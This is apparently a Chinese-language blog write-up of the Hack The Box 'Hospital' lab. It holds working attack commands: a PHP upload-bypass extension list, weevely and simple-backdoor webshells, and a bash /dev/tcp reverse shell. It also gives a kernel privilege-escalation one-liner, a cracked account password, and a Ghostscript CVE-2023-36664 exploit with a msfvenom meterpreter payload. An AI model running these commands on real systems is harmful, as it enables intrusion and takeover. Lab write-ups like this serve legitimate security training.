---
title: HTB Hospital Writeup
date: 2024-4-23
categories: LabWriteup,HackTheBox
tags: VulnerabilityRecurrence,PrivilegeEscalation
---

### Portinfo：

```bash
nmap 10.10.11.241 -n -Pn -p- -sT --min-rate 2000
```

![image-20240421173314650](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421173314650.png)

```bash
nmap 10.10.11.241 -p22,53,88,135,139,443,445,389,1801,2103,2105,2107,2179,3389,6404,6406,6407,6409,6617,6639,8080,9389 -sC -sV -oN portinfo.txt -Pn
```

![image-20240421180444299](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421180444299.png)

目标域名为**hospital.htb**，Windows机器，但是有Ubuntu的SSH服务，疑似存在容器，端口映射的现象。

### GetShell：

8080端口运行一个web服务：

![image-20240421182950757](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421182950757.png)

获取目录信息：

```
dirsearch -u http://hospital.htb:8080/
```

![image-20240421193832599](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421193832599.png)

没有账号密码，但是在以下地址可以注册一个：

```
http://hospital.htb:8080/register.php
```

![image-20240421183025332](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421183025332.png)

登录成功有一个文件上传接口：

![image-20240421183148093](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421183148093.png)

目标站点是PHP类型的，尝试上传php文件：

![image-20240421184745988](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421184745988.png)

如果将其更改为pdf会上传成功：

![image-20240421184926194](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421184926194.png)

枚举可上传的php执行文件后缀：

```bash
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
```

![image-20240421193345218](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421193345218.png)

执行枚举：

![image-20240421193303411](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421193303411.png)

**phar**可以正常上传：

![image-20240421193852873](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421193852873.png)

phpinfo里显示了一堆函数被禁用：

![image-20240421194500241](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421194500241.png)

可以用weevely自动化bypass disable_functions，生成webshell：

```bash
weevely generate 'password123' backdoor.phar
```

上传后使用weevely进行连接并反弹shell：

```bash
weevely http://hospital.htb:8080/uploads/backdoor.phar password123
```

![image-20240421202342884](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421202342884.png)

```bash
bash -c "/bin/bash -i >& /dev/tcp/10.10.16.28/443 0>&1"
```

收到shell：

![image-20240421202405970](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421202405970.png)

### GetDrwilliams：

升级shell：

```bash
script -qc /bin/bash /dev/null
CTRL+Z;
stty raw -echo; fg; 
reset;
screen;
```

查看内核版本：

![image-20240421202904391](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421202904391.png)

该内核版本有提权漏洞：

```
https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629?source=post_page-----887fd3d6fee9--------------------------------
```

输入如下命令：

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

![image-20240421203224697](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421203224697.png)

读取passwd：

![image-20240421203527409](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421203527409.png)

读取shadow：

![image-20240421203609501](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421203609501.png)

破解shadow可以获取到drwilliams用户的密码：

![image-20240421204003410](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240421204003410.png)

```bash
drwilliams:qwe123!@#
```

### GetDrbrown：

使用密码可以访问443端口的mail服务：

![image-20240423173927648](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240423173927648.png)

GhostScript存在一个CVE-2023-36664，漏洞分析可看以下文章：

```http
https://www.kroll.com/en/insights/publications/cyber/ghostscript-cve-2023-36664-remote-code-execution-vulnerability
```

EXP可以在github上找到：

```http
https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
```

使用msfvenom生成exe：

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.28 LPORT=443 -f exe -o shell.exe
```

![image-20240424102229515](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240424102229515.png)

制作payload：

```bash
 python CVE_2023_36664_exploit.py --inject --payload 'cmd.exe /c \\\\10.10.16.28\\share\\shell.exe' --filename file.eps
```

![image-20240424102518769](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240424102518769.png)

启动smbserver：

```bash
smbserver.py share . -smb2support
```

![image-20240424102543137](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240424102543137.png)

对邮件进行回复：

![image-20240424102823767](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240424102823767.png)

共享被访问：

![image-20240424102951089](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240424102951089.png)

监听到Meterpreter会话：

![image-20240424103244935](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240424103244935.png)

为保证不必要的麻烦，进行进程迁移：

![image-20240424103343817](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240424103343817.png)

用户flag：

![image-20240424142047940](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240424142047940.png)

GetSystem：

获取web权限：

```
upload /usr/share/webshells/php/simple-backdoor.php
```

![image-20240424142320186](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240424142320186.png)

Web服务是以system权限运行的：

```bash
curl -k https://hospital.htb/simple-backdoor.php?cmd=whoami
```

![image-20240424142452737](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240424142452737.png)

上传木马：

```bash
upload /home/kali/Expliot/CVE-2023-36664-Ghostscript-command-injection/shell.exe
```

![image-20240424142703802](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240424142703802.png)

启动木马：

```bash
curl -k https://hospital.htb/simple-backdoor.php?cmd=shell.exe
```

![image-20240424142805471](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240424142805471.png)

收到会话回连：

![image-20240424142728347](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240424142728347.png)

获取root.txt:

![image-20240424143048321](https://raw.githubusercontent.com/Annabelline/Annabelline.github.io/main/assets/img/blogimage/image-20240424143048321.png)
